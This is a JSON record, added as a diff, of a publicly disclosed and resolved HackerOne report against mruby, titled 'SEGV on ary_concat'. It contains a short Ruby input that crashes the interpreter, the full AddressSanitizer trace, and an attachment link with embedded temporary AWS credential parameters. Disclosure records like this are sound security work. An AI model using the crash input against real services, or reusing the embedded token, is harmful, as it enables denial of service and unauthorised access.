@@ -1,0 +1,117 @@
+{
+  "id": 296198,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTYxOTg=",
+  "url": "https://hackerone.com/reports/296198",
+  "title": "SEGV on ary_concat",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2017-12-08T11:21:42.518Z",
+  "submitted_at": "2017-12-08T11:21:42.518Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ahihi",
+    "url": "/ahihi",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/106/056/b44f0450b0a2fca355ff6f460bd05357f4b9912b_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15668,
+    "url": "https://hackerone.com/shopify-scripts",
+    "handle": "shopify-scripts",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "shopify-scripts",
+      "twitter_handle": "",
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-01-17T22:44:38.658Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2017-12-18T22:44:38.066Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The following input demonstrates a crash:\n```\ndef z\n return * begin\n   [0].each do\n    return\n   end\n rescue => x\n   ensure\n   x.backtrace\n end\nend\nz\n```\nASAN report\n```\n./mruby/bin/mruby asd.rb\nASAN:DEADLYSIGNAL\n=================================================================\n==43761==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x00010541ceea bp 0x7ffeea8432d0 sp 0x7ffeea8430b0 T0)\n==43761==The signal is caused by a READ memory access.\n==43761==Hint: address points to the zero page.\n    #0 0x10541cee9 in ary_concat array.c:293\n    #1 0x10541ccfa in mrb_ary_concat array.c:312\n    #2 0x1054799a9 in mrb_vm_exec vm.c:2634\n    #3 0x105450034 in mrb_vm_run vm.c:933\n    #4 0x105486f5c in mrb_top_run vm.c:2974\n    #5 0x105645ac0 in mrb_load_exec parse.y:5840\n    #6 0x1056468e5 in mrb_load_file_cxt parse.y:5849\n    #7 0x1053b596c in main mruby.c:227\n    #8 0x7fff7ab3e144 in start (libdyld.dylib:x86_64+0x1144)\n\n==43761==Register values:\nrax = 0x0000000000000000  rbx = 0x00007ffeea843340  rcx = 0x0000100000000000  rdx = 0x0000000000000000\nrdi = 0x0000614000000000  rsi = 0x0000100000000000  rbp = 0x00007ffeea8432d0  rsp = 0x00007ffeea8430b0\n r8 = 0x00001fffdd508664   r9 = 0x00007ffeea843320  r10 = 0x0000000106571788  r11 = 0xae48a47313800041\nr12 = 0x00007ffeea84a3e0  r13 = 0x00007ffeea84a400  r14 = 0x00001fffdd50947c  r15 = 0x0000100000000000\nAddressSanitizer can not provide additional info.\nSUMMARY: AddressSanitizer: SEGV array.c:293 in ary_concat\n==43761==ABORTING\nAbort trap: 6\n```\n\n## Impact\n\nCrashed on both mruby and mirb.",
+  "weakness": {
+    "id": 2,
+    "name": "Memory Corruption - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 245235,
+      "file_name": "asd.rb",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/245/235/defdf2dae6c4d279981842bddd0ecd366dea2897/asd.rb?response-content-disposition=attachment%3B%20filename%3D%22asd.rb%22%3B%20filename%2A%3DUTF-8%27%27asd.rb&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSM5TYSS4%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T025615Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDw5GjXhifUQbm0a%2BZZh5r17HpLp1N%2FMs9cznLdnnQyIAIhAPbWpZsaaUzotfFaQqCHlu6bLoyEtVdt%2BqUrsrYhu3hVKrsFCKH%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgyGLAnB2G40BOKzrW4qjwXmCwtMBlh6OGROFIEpgc4RtUkGU%2BNEH4crN8gOvxRaC0pId1LM6%2BQxWi6Yq%2FkQMXLMe6AoJwe9E1bZ%2Bie9eAPTtbpMSQZ1oTMD53ZEcTK1z1BWtnQA5HDgCK6rBxSomkJ2nwdx%2FTvdhcGZKW9MqNQQYxsZqtRi94NTxBLVpcjh%2FwWjEBpcQ72%2B%2FDxSgcsS%2F8LE45QRlHkz%2BqMjNox2h8L%2Fa3rTwfflohe3LJ7fIpvvNn4G3pdFB1SW9OrRWhwhD0jR2CRWVkSup49%2FiTqgkJzEAo5GJ3ASW5sJKSTLQ6GmgyOG6Q%2F2afR0Jm18UiBuV3Ow%2FURddX83FvHb%2BZdR%2F7rPMMbG6CmRQvLcWtSmpWiLO2K9iRFDytDJUvfXud%2BCId%2BnEfCudbrD21usrI9mBoC6rMmtZfhs%2FiefqGUv4fjYDYwdPxiVY294n5srkf531Z4DqyebY8EzCOhKoO2TINtAgo8tuH3L6kcOMtr6Tq0JIFD6mQ4Yvv6eUwjNiNtuB5Hu3lvldbXftneilkcKBCxSPe8EPtc13YIKSiIHW6c8Q0kgp7K3XeJu52dbvepY0S8aSla4BDQnZu9jOInVZlcyF9atzdgfoV6n69b2HrWdNkfl9e93Q7vKn2nLvo6S2VBy%2BZmDaixszZ6icuVY4As4vRGgXauWH29CeGXi9WY4fUb8APguhThc7I7VXPsk38YUEo8cHCeh4vwinCvAhXxiTkP2G1I4QnwZxjxgYnr%2FeOSIXeAmThUxIzhQ9C3HvPhvD%2BMeCWAewQpQGvOwW9KdXxLwo0VPP6BWtWVR94EyhaOZ13uM%2FwCRMe%2BiW2YAlfzbGW86BEJifuMDYc672kQk4O9HlXj%2Fz0lKTB2wmriHMMrw48wGOrABZWoxXRPIJiCeePxj%2Bzxf13YvrwMppSq1DIQeHrN%2BV73MbdI7pGx%2FZ%2BPesC0wZ6YykBBajLUjhdlq77jIBZoNFBJomRqJYShkG4sCBpdhWqhBAWJUfmHJHqrU9%2B8UWUO0EahjpNI70%2BFOiDE6ngWBVOhE3YxVmWbk0Ckt07Ftj2FlUhSkNqqPdIYYbolpz%2Bp3RLcLjiPChFo%2FllUJ4r6RIK7jCzoOrdFik3z7Xb%2BOOmQ%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=04d31b919f3f7d4ee620986ec1556242e63cdeb6c357fef9252ab297c1211df0",
+      "file_size": 111,
+      "type": "text/plain",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-01-17T22:44:38.149Z",
+  "allow_singular_disclosure_after": -255413497.4712251,
+  "singular_disclosure_allowed": true,
+  "vote_count": 5,
+  "voters": [
+    "heeeeen",
+    "eveeez",
+    "cr4xerbik4sh",
+    "japz",
+    "spetr0x"
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
